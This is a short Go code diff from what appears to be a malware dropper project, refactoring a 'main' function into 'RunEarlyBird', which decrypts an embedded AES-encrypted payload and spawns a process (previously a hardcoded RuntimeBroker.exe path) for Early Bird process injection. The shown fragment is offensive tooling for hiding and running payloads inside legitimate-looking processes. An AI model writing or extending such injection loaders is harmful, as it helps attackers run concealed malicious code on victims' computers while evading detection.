@@ -1,4 +1,4 @@
-package main
+package earlybird
 
 import (
 	embedder "GoDroplets"
@@ -100,11 +100,11 @@ func ResumeThread(hThread windows.Handle) (e error) {
 	return e
 }
 
-func main() {
+func RunEarlyBird(pathSpawnedProc string) {
 
     ppayloadDecrypted := cipher.AesDecrypt(&embedder.Key, &embedder.PayloadEncrypted)
 
-	s := "C:\\Windows\\System32\\RuntimeBroker.exe"
+	s := pathSpawnedProc
     lpCommandLine, _ := syscall.UTF16PtrFromString(s)
 
     var pi windows.ProcessInformation = windows.ProcessInformation{}
